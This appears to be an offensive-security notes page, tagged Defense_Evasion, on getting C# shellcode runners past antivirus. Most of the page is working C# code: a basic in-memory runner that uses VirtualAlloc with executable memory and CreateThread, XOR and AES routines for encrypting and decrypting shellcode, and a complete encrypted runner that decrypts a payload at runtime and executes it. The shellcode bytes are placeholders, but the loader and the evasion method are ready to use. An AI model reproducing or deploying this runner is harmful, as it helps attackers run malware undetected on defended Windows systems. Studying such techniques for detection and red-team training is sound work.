---
tags:
  - Defense_Evasion
  - Foundational
  - Windows
---

## C# Shellcode Runner vs Antivirus
resources: [ired.team - AV Evasion](https://www.ired.team/offensive-security/defense-evasion)

> [!info] Custom C# shellcode runners can evade AV through encryption and obfuscation.

### Basic C# Runner (Detected)
> [!warning] This basic implementation will likely be detected by AV.
```csharp
// This will likely be detected
byte[] buf = new byte[<Size>] { 0xfc, 0x48, 0x83, ... };
IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
Marshal.Copy(buf, 0, addr, buf.Length);
CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
```

## Encrypting the C# Shellcode Runner

### XOR Encryption

#### XOR Encrypt Shellcode [Local]
```csharp
byte[] buf = new byte[] { 0xfc, 0x48, 0x83, ... };
byte[] key = Encoding.ASCII.GetBytes("mysecretkey12345");
byte[] encoded = new byte[buf.Length];

for (int i = 0; i < buf.Length; i++)
{
    encoded[i] = (byte)(buf[i] ^ key[i % key.Length]);
}

// Output as C# array
StringBuilder sb = new StringBuilder();
sb.Append("byte[] buf = new byte[" + encoded.Length + "] { ");
for (int i = 0; i < encoded.Length; i++)
{
    sb.Append("0x" + encoded[i].ToString("x2"));
    if (i < encoded.Length - 1) sb.Append(", ");
}
sb.Append(" };");
Console.WriteLine(sb.ToString());
```

#### XOR Decrypt at Runtime
```csharp
byte[] buf = new byte[<Size>] { /* XOR encrypted shellcode */ };
byte[] key = Encoding.ASCII.GetBytes("mysecretkey12345");

for (int i = 0; i < buf.Length; i++)
{
    buf[i] = (byte)(buf[i] ^ key[i % key.Length]);
}

// buf now contains decrypted shellcode
```

### AES Encryption

#### AES Encrypt Shellcode [Local]
```csharp
using System.Security.Cryptography;

byte[] shellcode = new byte[] { 0xfc, 0x48, ... };
byte[] key = new byte[32]; // 256-bit key
byte[] iv = new byte[16];  // 128-bit IV

using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
{
    rng.GetBytes(key);
    rng.GetBytes(iv);
}

using (Aes aes = Aes.Create())
{
    aes.Key = key;
    aes.IV = iv;
    ICryptoTransform encryptor = aes.CreateEncryptor(aes.Key, aes.IV);

    using (MemoryStream ms = new MemoryStream())
    {
        using (CryptoStream cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))
        {
            cs.Write(shellcode, 0, shellcode.Length);
        }
        byte[] encrypted = ms.ToArray();
        // Output key, iv, and encrypted bytes
    }
}
```

#### AES Decrypt at Runtime
```csharp
byte[] encrypted = new byte[] { /* AES encrypted shellcode */ };
byte[] key = new byte[] { /* 32 byte key */ };
byte[] iv = new byte[] { /* 16 byte IV */ };

using (Aes aes = Aes.Create())
{
    aes.Key = key;
    aes.IV = iv;
    ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV);

    using (MemoryStream ms = new MemoryStream(encrypted))
    {
        using (CryptoStream cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))
        {
            byte[] decrypted = new byte[encrypted.Length];
            int bytesRead = cs.Read(decrypted, 0, decrypted.Length);
            // Trim to actual size
            byte[] shellcode = new byte[bytesRead];
            Array.Copy(decrypted, shellcode, bytesRead);
        }
    }
}
```

### Complete Encrypted Runner
```csharp
using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.IO;

class Program
{
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    static byte[] Decrypt(byte[] encrypted, byte[] key, byte[] iv)
    {
        using (Aes aes = Aes.Create())
        {
            aes.Key = key;
            aes.IV = iv;
            using (var decryptor = aes.CreateDecryptor())
            using (var ms = new MemoryStream(encrypted))
            using (var cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))
            using (var output = new MemoryStream())
            {
                cs.CopyTo(output);
                return output.ToArray();
            }
        }
    }

    static void Main()
    {
        byte[] encrypted = new byte[] { /* encrypted shellcode */ };
        byte[] key = new byte[] { /* key */ };
        byte[] iv = new byte[] { /* iv */ };

        byte[] buf = Decrypt(encrypted, key, iv);

        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
        Marshal.Copy(buf, 0, addr, buf.Length);
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
}
```
